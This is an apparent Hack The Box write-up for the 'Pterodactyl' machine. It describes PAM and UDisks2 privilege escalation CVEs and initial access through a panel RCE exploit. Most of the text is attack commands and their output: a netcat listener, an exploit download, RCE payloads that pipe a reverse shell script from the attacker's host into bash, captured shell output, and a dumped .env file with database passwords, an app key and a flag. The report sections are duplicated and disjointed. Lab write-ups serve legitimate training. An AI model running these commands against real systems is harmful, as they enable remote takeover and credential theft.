@@ -1,0 +1,141 @@
+HTB Pterodactyl - Privilege Escalation Write-up
+🛡️ Security Assessment Report: Pterodactyl
+1. Executive Summary
+During a security assessment of the Pterodactyl host, a critical privilege escalation chain was identified. By combining a vulnerability in the PAM environment configuration (CVE-2025-6018) with a logic flaw in the UDisks2 service (CVE-2025-6019), a local unprivileged user can gain full root access.
+
+2. Vulnerability Details
+Vulnerability A: PAM Environment Injection (CVE-2025-6018)
+Type: Environment Variable Injection
+
+Severity: Medium
+
+Description: The system allows users to define environment variables in ~/.pam_environment. This can be used to override critical session variables (like XDG_SEAT or DBUS_SESSION_BUS_ADDRESS) which influence the behavior of privileged daemons.
+
+Vulnerability B: UDisks2 Authorization Bypass (CVE-2025-6019)
+Type: Logic Flaw / Privilege Escalation
+
+Severity: High
+
+Description: When udisks2 processes requests from a session that claims to be "local" and "active" via spoofed environment variables, it fails to properly validate Polkit authorizations, allowing unauthorized mount operations.
+
+
+
+🛡️ Vulnerability Research Report: Pterodactyl
+1. Phase I: Reconnaissance & Initial Access
+Objective: Identify entry points and establish a low-privileged session.
+
+Step 1: Network Scanning
+A full TCP port scan was conducted to identify running services.
+nmap -p- -sV -sC -T4 10.129.7.5
+
+ssh phileasfogg3@10.129.7.5
+# Password: !QAZ2wsx
+
+2. Phase II: Vulnerability Analysis (Local)
+Objective: Identify a path from User to Root.
+
+Upon internal enumeration, the system was found to be running a vulnerable version of PAM and UDisks2.
+
+OS: SUSE Linux / openSUSE
+
+Vulnerability A: CVE-2025-6018 (PAM Environment Injection)
+
+Vulnerability B: CVE-2025-6019 (UDisks2 Logic Bypass)
+
+
+TARGET: 10.129.7.5
+KALI IP: 10.10.16.135
+USER FLAG: d4bb7004025b03ca0bc1951d729d763a
+ROOT FLAG: []
+
+
+# Start netcat listener to catch reverse shell
+nc -lvnp 4444
+
+# Create directory and start HTTP server
+mkdir -p ~/Documents/HTB/Pterodactyl
+cd ~/Documents/HTB/Pterodactyl
+python3 -m http.server 8080
+
+
+# Download the exploit
+wget https://raw.githubusercontent.com/exploit-db/exploitdb/main/exploits/php/webapps/49132.py -O CVE-2025-49132.py
+
+# Run against target
+python3 CVE-2025-49132.py --host panel.pterodactyl.htb --interactive
+
+python3 exploit.py --pear-dir ../../../../../../../usr/share/php/PEAR --rce-cmd "curl http://10.10.16.135:8080/revshell.sh | bash" http://panel.pterodactyl.htb
+
+# At the shell> prompt, execute:
+shell> curl http://10.10.16.135:8080/shell.sh | bash
+
+
+www-data@pterodactyl:/var/www/pterodactyl$ cat .env
+
+
+┌──(bug㉿kali)-[~]
+└─$ nc -lvnp 4444             
+listening on [any] 4444 ...
+connect to [10.10.16.135] from (UNKNOWN) [10.129.7.5] 37230
+bash: cannot set terminal process group (1215): Inappropriate ioctl for device
+bash: no job control in this shell
+wwwrun@pterodactyl:/var/www/pterodactyl/public> cat .env
+cat .env
+cat: .env: No such file or directory
+wwwrun@pterodactyl:/var/www/pterodactyl/public> /var/www/pterodactyl$ cat .env
+</pterodactyl/public> /var/www/pterodactyl$ cat .env
+bash: /var/www/pterodactyl$: No such file or directory
+wwwrun@pterodactyl:/var/www/pterodactyl/public> cat /var/www/pterodactyl/.env
+cat /var/www/pterodactyl/.env
+APP_ENV=production
+APP_DEBUG=false
+APP_KEY=base64:UaThTPQnUjrrK61o+Luk7P9o4hM+gl4UiMJqcbTSThY=
+APP_THEME=pterodactyl
+APP_TIMEZONE=UTC
+APP_URL="http://panel.pterodactyl.htb"
+APP_LOCALE=en
+APP_ENVIRONMENT_ONLY=false
+
+LOG_CHANNEL=daily
+LOG_DEPRECATIONS_CHANNEL=null
+LOG_LEVEL=debug
+
+DB_CONNECTION=mysql
+DB_HOST=127.0.0.1
+DB_PORT=3306
+DB_DATABASE=panel
+DB_USERNAME=pterodactyl
+DB_PASSWORD=PteraPanel
+
+REDIS_HOST=127.0.0.1
+REDIS_PASSWORD=null
+REDIS_PORT=6379
+
+CACHE_DRIVER=redis
+QUEUE_CONNECTION=redis
+SESSION_DRIVER=redis
+
+HASHIDS_SALT=pKkOnx0IzJvaUXKWt2PK
+HASHIDS_LENGTH=8
+
+MAIL_MAILER=smtp
+MAIL_HOST=smtp.example.com
+MAIL_PORT=25
+MAIL_USERNAME=
+MAIL_PASSWORD=
+MAIL_ENCRYPTION=tls
+MAIL_FROM_ADDRESS=no-reply@example.com
+MAIL_FROM_NAME="Pterodactyl Panel"
+# You should set this to your domain to prevent it defaulting to 'localhost', causing
+# mail servers such as Gmail to reject your mail.
+#
+# @see: https://github.com/pterodactyl/panel/pull/3110
+# MAIL_EHLO_DOMAIN=panel.example.com
+
+APP_SERVICE_AUTHOR="pterodactyl@pterodactyl.htb"
+PTERODACTYL_TELEMETRY_ENABLED=false
+RECAPTCHA_ENABLED=false
+wwwrun@pterodactyl:/var/www/pterodactyl/public> 
+
+
+DB_PASSWORD=PteraPanel
